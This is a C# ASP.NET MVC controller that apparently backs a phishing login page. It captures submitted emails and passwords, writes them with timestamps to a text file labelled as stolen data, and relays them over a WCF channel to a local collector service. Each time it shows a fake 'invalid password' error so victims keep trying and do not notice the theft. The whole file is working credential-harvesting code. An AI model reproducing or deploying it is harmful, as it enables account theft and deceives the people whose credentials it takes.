using Common;
using System;
using System.Collections.Generic;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.ServiceModel;
using System.Web;
using System.Web.Hosting;
using System.Web.Mvc;

namespace WebsiteDummy.Controllers
{
	public class HomeController : Controller
	{
		static IFlag channel = null;

		public ActionResult Index()
		{

			return View();
		}

		[HttpPost]
		public ActionResult CollectData(string email, string password)
		{

			if (email == string.Empty || password == string.Empty)
			{

				ViewBag.error = "Invalid username or password";
				return View("Index");
			}
					

			string stollenData = email + ";" + password + ";" + DateTime.Now.ToString();

			string path = HostingEnvironment.MapPath("~/App_Data/database.txt");
			FileStream stream = new FileStream(path, FileMode.Append);
			


			using (StreamWriter sw = new StreamWriter(stream))
			{
				sw.WriteLine(stollenData);
			}


			ChannelFactory<IFlag> factory = new ChannelFactory<IFlag>(new NetTcpBinding(), new EndpointAddress("net.tcp://localhost:4000/IFlag"));
			if (channel == null)
			{
				channel = factory.CreateChannel();
			}

			channel.SendData(stollenData);


			ViewBag.error = "Invalid username or password";
			return View("Index");
		}


	}
}